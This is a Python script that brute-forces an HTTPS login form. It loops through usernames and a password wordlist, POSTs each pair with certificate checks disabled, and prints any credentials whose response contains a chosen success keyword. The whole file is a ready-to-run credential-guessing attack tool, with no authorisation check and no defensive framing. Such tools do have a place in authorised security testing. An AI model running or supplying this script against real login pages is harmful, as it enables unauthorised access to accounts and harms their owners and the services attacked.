import os
import requests
from urllib3.exceptions import InsecureRequestWarning

# Suppress warnings for self-signed certs
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def load_usernames(input_value):
    if os.path.isfile(input_value):
        with open(input_value, "r", encoding="utf-8", errors="ignore") as f:
            return [line.strip() for line in f if line.strip()]
    else:
        return [input_value.strip()]

def load_passwords(filepath):
    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip()]

def https_brute_force(url, user_field, pass_field, usernames, passwords, success_check):
    print(f"[+] Starting HTTPS brute-force on {url}")

    for username in usernames:
        for password in passwords:
            data = {
                user_field: username,
                pass_field: password
            }

            try:
                print(f"[*] Trying: {username}:{password}")
                response = requests.post(url, data=data, timeout=5, verify=False, allow_redirects=False)

                if success_check.lower() in response.text.lower():
                    print(f"[âœ”] SUCCESS -> {username}:{password}")
                    choice = input("Continue brute-force? (y/n): ").lower()
                    if choice != 'y':
                        return
                else:
                    print(f"[-] Invalid: {username}:{password}")

            except Exception as e:
                print(f"[!] Error: {e}")

    print("[-] Brute-force complete. No valid credentials found.")

if __name__ == "__main__":
    url = input("Target HTTPS login URL (e.g. https://192.168.1.10/login): ").strip()
    user_field = input("Username field name (e.g. user): ").strip()
    pass_field = input("Password field name (e.g. pass): ").strip()

    username_input = input("Username or path to username list: ").strip()
    password_file = input("Path to password wordlist: ").strip()
    success_check = input("Keyword that appears on successful login (e.g. dashboard, logout): ").strip()

    usernames = load_usernames(username_input)
    passwords = load_passwords(password_file)

    https_brute_force(url, user_field, pass_field, usernames, passwords, success_check)
